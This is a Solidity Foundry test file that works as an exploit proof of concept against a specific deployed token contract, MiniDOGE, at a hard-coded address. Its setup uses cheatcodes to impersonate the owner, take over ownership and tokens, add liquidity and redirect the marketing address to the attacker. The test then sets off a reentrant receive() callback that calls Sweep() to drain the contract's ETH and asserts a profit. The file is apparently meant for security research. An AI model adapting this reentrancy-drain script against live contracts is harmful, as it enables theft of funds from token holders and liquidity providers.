// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface MiniDOGE {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external;
    function uniswapV2Router() external view returns (IUniswapV2Router02);
    function uniswapV2Pair() external view returns (address);
    function setMaxTxAmount(uint256 maxTxAmount) external;
    function totalSupply() external view returns (uint256);
    function _maxTxAmount() external view returns (uint256);

    function setMarketingAddress(address payable _marketingAddress) external;
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function minimumTokensBeforeSwapAmount() external view returns (uint256);
    function _intervalMinutesForSwap() external view returns (uint256);

    function Sweep() external;
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xBa07EED3d09055d60CAEf2bDfCa1c05792f2dFad;
    address attacker = address(this);
    MiniDOGE public target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = MiniDOGE(payable(TARGET));
        address originalOwner = target.owner();

        // --- Attacker takes over ownership and token supply ---
        deal(originalOwner, 1 ether);
        vm.startPrank(originalOwner);
        // Transfer all tokens from the original owner to the attacker
        target.transfer(attacker, target.balanceOf(originalOwner));
        // Transfer ownership to the attacker
        target.transferOwnership(attacker);
        vm.stopPrank();

        // --- Attacker provides liquidity to enable swaps ---
        deal(attacker, 100 ether);
        address routerAddress = address(target.uniswapV2Router());
        uint256 tokenAmountForLiquidity = target.totalSupply() / 100; // Use 1% of total supply

        // Set max tx amount to be able to add liquidity
        target.setMaxTxAmount(tokenAmountForLiquidity);
        // Approve router to spend tokens
        target.approve(routerAddress, type(uint256).max);
        // Add liquidity
        IUniswapV2Router02(routerAddress).addLiquidityETH{value: 50 ether}(
            address(target),
            tokenAmountForLiquidity,
            0,
            0,
            attacker,
            block.timestamp
        );

        // --- Attacker sets up exploit conditions as the new owner ---
        target.setMarketingAddress(payable(attacker));
        target.setSwapAndLiquifyEnabled(true);

        // --- Trigger fee accumulation to meet swap threshold ---
        // A transfer to a regular address incurs a 10% liquidity fee.
        // We need target.balanceOf(target) > minimumTokensBeforeSwap (2e20).
        // The default maxTx is 3e21. The fee is 10% of that, 3e20, which is > 2e20.
        uint256 amountToGenerateFees = target._maxTxAmount();
        target.transfer(address(0xdead), amountToGenerateFees);

        // Verify precondition is met
        assertGe(target.balanceOf(address(target)), target.minimumTokensBeforeSwapAmount(), "Precondition failed: Contract token balance is too low.");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Advance time to bypass swap cooldown
                vm.warp(block.timestamp + target._intervalMinutesForSwap() + 1);

                // Trigger reentrancy by making a small sale (transfer to pair)
                // This calls _transfer -> swapTokens -> transferToAddressETH -> attacker.receive()
                address pairAddress = target.uniswapV2Pair();
                target.transfer(pairAddress, 1);
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {
        // Re-enter the contract if it has an ETH balance from the swap
        if (address(target).balance > 0) {
            // As the owner, we can call Sweep to drain the contract's ETH
            target.Sweep();
        }
    }
}

